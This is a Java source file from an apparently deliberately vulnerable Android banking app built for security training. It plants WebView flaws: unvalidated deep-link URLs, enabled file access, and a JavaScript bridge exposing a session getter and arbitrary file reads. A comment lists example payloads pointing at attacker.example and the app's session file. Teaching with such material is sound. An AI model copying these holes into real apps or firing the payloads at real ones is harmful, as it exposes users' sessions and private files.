package eu.cadmus.vulnbank.insecure;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.appcompat.app.AppCompatActivity;

/**
 * CADMUS VulnBank - in-app support portal.
 *
 * DELIBERATELY VULNERABLE TRAINING APPLICATION - DO NOT DEPLOY
 *
 * Planted defects: M4 (Insufficient Input/Output Validation),
 *                  M8 (Security Misconfiguration)
 *
 * ---------------------------------------------------------------------------
 * N1 TEACHING NOTE
 *
 * WebView is the largest single source of mobile input-validation findings,
 * because it imports the entire web attack surface into a native app that has
 * native permissions.
 *
 * The chain here is worth walking through slowly on a slide:
 *   1. The activity is exported with a BROWSABLE deep link (manifest).
 *   2. It loads a URL taken from the Intent, unvalidated.
 *   3. JavaScript is enabled.
 *   4. A @JavascriptInterface bridge exposes native methods to that page.
 *   5. File and content URL access is enabled.
 *
 * Each step is individually defensible. The COMBINATION means any web page,
 * reached from any link the user taps, can call getSessionToken() and read
 * arbitrary local files. No single line of this file is the vulnerability -
 * a point worth making explicitly when introducing root-cause analysis.
 * ---------------------------------------------------------------------------
 */
public class SupportWebViewActivity extends AppCompatActivity {

    private static final String TAG = "VulnBank.Support";
    private static final String DEFAULT_URL = "http://support.vulnbank.local/help";

    private WebView webView;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        webView = new WebView(this);
        setContentView(webView);

        WebSettings settings = webView.getSettings();

        // PLANTED DEFECT (M4/M8): JavaScript enabled on a WebView that loads
        // attacker-influenceable URLs.
        settings.setJavaScriptEnabled(true);

        // PLANTED DEFECT (M4): file:// and content:// access from within
        // loaded pages. Combined with an attacker-controlled URL this permits
        // reading the app's private files, including session.xml.
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccessFromFileURLs(true);
        settings.setAllowUniversalAccessFromFileURLs(true);

        // PLANTED DEFECT (M5): mixed content permitted, so an HTTPS page can
        // pull scripts over plaintext HTTP.
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        // PLANTED DEFECT (M4): a native bridge exposed to whatever page loads.
        // Every public method annotated @JavascriptInterface on this object is
        // callable as window.VulnBankBridge.method() by the page's JavaScript.
        webView.addJavascriptInterface(new SupportBridge(), "VulnBankBridge");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                // PLANTED DEFECT (M4): every navigation is allowed. There is
                // no allow-list of permitted origins, so the WebView follows
                // a redirect to any host on the internet while retaining the
                // JavaScript bridge.
                return false;
            }
        });

        loadFromIntent(getIntent());
    }

    /**
     * PLANTED DEFECT (M4 - Insufficient Input/Output Validation)
     *
     * The loaded URL is taken from the Intent with no validation of scheme,
     * host, or path. Because the activity is exported and BROWSABLE, a link
     * in an email or a QR code reaches this line.
     *
     * Payload shapes worth demonstrating in CR1:
     *   vulnbank://open?url=https://attacker.example/collect.html
     *   vulnbank://open?url=file:///data/data/eu.cadmus.vulnbank/shared_prefs/session.xml
     *   javascript:  (on older WebView implementations)
     */
    private void loadFromIntent(Intent intent) {
        String target = DEFAULT_URL;

        if (intent != null) {
            Uri data = intent.getData();
            if (data != null && data.getQueryParameter("url") != null) {
                target = data.getQueryParameter("url");
            } else if (intent.getStringExtra("support_url") != null) {
                target = intent.getStringExtra("support_url");
            }
        }

        Log.i(TAG, "Loading support URL " + target);
        webView.loadUrl(target);
    }

    /**
     * PLANTED DEFECT (M4): the JavaScript bridge itself.
     *
     * getSessionToken() hands the bearer token to any page in the WebView.
     * readLocalFile() is a straightforward arbitrary-file-read primitive.
     *
     * The bridge exists because the support portal needed to show the user's
     * account number without asking them to type it - a genuine product
     * requirement, solved by punching a hole through the trust boundary.
     */
    private class SupportBridge {

        @JavascriptInterface
        public String getSessionToken() {
            return new SessionManager(SupportWebViewActivity.this).getUsername();
        }

        @JavascriptInterface
        public String getDeviceIdentifier() {
            return android.os.Build.FINGERPRINT;
        }

        @JavascriptInterface
        public String readLocalFile(String path) {
            try {
                java.io.File file = new java.io.File(path);
                byte[] bytes = new byte[(int) file.length()];
                java.io.FileInputStream in = new java.io.FileInputStream(file);
                int read = in.read(bytes);
                in.close();
                return read > 0 ? new String(bytes) : "";
            } catch (Exception e) {
                return "ERROR " + e.getMessage();
            }
        }
    }
}
